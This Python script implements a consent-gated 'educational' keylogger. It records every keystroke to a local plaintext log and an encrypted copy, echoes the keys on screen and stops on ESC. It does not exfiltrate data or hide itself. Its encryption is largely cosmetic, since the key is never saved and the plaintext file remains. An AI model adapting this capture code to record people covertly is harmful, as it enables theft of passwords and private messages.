from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import time
import os

class Keylogger:
    def __init__(self):
        self.log_file = "keystrokes.log"
        self.encrypted_file = "keystrokes_encrypted.bin"
        self.keys = []
        self.start_time = time.time()
        
        # Generate encryption key
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
        self.display_warning()
    
    def display_warning(self):

        print("\n" + "="*50)
        print("ETHICAL KEYLOGGER - FOR EDUCATIONAL USE ONLY")
        print("="*50)
        print("[!] This program will log all keyboard inputs.")
        print("[!] It will ONLY run with your explicit consent.")
        print("[!] All data is stored locally with encryption.\n")
        
        consent = input("Do you agree to proceed? (Y/N): ").strip().lower()
        if consent != 'y':
            print("\n[!] Consent not given. Exiting program.")
            exit()
        
        print("\n[+] Keylogger started. Press ESC to stop logging...\n")
    
    def encrypt_data(self, data):
        """Encrypt the logged data"""
        return self.cipher.encrypt(data.encode())
    
    def write_to_file(self, keys):
        """Write logged keys to file (plaintext and encrypted)"""
        with open(self.log_file, "a") as f:
            for key in keys:
                # Format the key for better readability
                k = str(key).replace("'", "")
                if k.find("Key.") == -1:  # Regular character
                    f.write(k)
                else:  # Special key
                    f.write(f"[{k}] ")
            
            # Add newline after each batch
            f.write("\n")
        
        # Also store encrypted version
        with open(self.log_file, "r") as f:
            data = f.read()
            encrypted_data = self.encrypt_data(data)
            with open(self.encrypted_file, "wb") as ef:
                ef.write(encrypted_data)
    
    def on_press(self, key):
        """Callback for key press events"""
        self.keys.append(key)
        
        # Write to file every 10 characters (reduces disk I/O)
        if len(self.keys) >= 10:
            self.write_to_file(self.keys)
            self.keys = []
        
        # Display feedback
        try:
            print(f"Typed: {key.char}", end=" ", flush=True)
        except AttributeError:
            print(f"[Special Key: {key}]", end=" ", flush=True)
    
    def on_release(self, key):
        """Callback for key release events"""
        if key == Key.esc:
            # Save any remaining keys before exiting
            if self.keys:
                self.write_to_file(self.keys)
            
            # Calculate session duration
            duration = time.time() - self.start_time
            mins, secs = divmod(duration, 60)
            
            print(f"\n\n[+] Session ended after {int(mins)}m {int(secs)}s")
            print(f"[+] Plaintext log saved to: {self.log_file}")
            print(f"[+] Encrypted log saved to: {self.encrypted_file}")
            print("[!] Remember to delete these files when done testing\n")
            return False  # Stop listener

    def start(self):
        """Start the keylogger"""
        with Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    logger = Keylogger()
    logger.start()